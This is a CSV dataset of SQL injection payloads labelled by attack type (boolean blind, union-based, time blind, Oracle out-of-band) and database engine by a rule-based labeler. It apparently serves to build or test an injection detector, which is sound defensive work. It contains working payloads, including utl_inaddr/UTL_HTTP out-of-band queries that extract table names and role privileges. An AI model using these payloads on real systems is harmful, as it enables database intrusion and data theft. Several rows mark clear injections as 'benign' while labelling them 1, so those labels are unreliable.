row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
210,"select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
211,||UTL_HTTP.REQUEST,1,,out_of_band,generic,0.85,UTL_HTTP detected — out_of_band injection (priority 2) on generic,rule-based
212,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
213,"select * from users where id = '1'<@.. union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @.. union select detected — union_based injection (priority 7) on generic",rule-based
214,""" ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
215,"select * from users where id = 1 <@.$ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @.$ union select detected — union_based injection (priority 7) on generic",rule-based
216,"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
217,select * from users where id = '1' <@.$ or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
218,1 uni on select all from where,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
219,"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
220,"select * from users where id = 1 or 1#""? union select null,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
221,admin' ) or '1' = '1'#,1,,boolean_blind,generic,0.95,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
222,||utl_http.request ( 'httP://192.168.1.1/' ) ||',1,,out_of_band,generic,0.95,utl_http detected — out_of_band injection (priority 2) on generic,rule-based
223,or '7659' = '7659,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
224,"select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
225,"select * from users where id = 1 union select +!<1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
226,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
227,"select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
228,"select * from users where id = 1 union select !<1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
229,"select * from users where id = '1' union select \#,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
230,"select * from users where id = 1 or 1#""{ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
231,""" or true--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
232,select * from users where id = 1. or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
233,"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @#"", = 1 union select detected — union_based injection (priority 7) on generic",rule-based
234,"select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
235,â or 3 = 3 --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
236,AND 1 = utl_inaddr.get_host_address ( ( SELECT global_name FROM global_name ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
237,"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
238,"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
239,"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
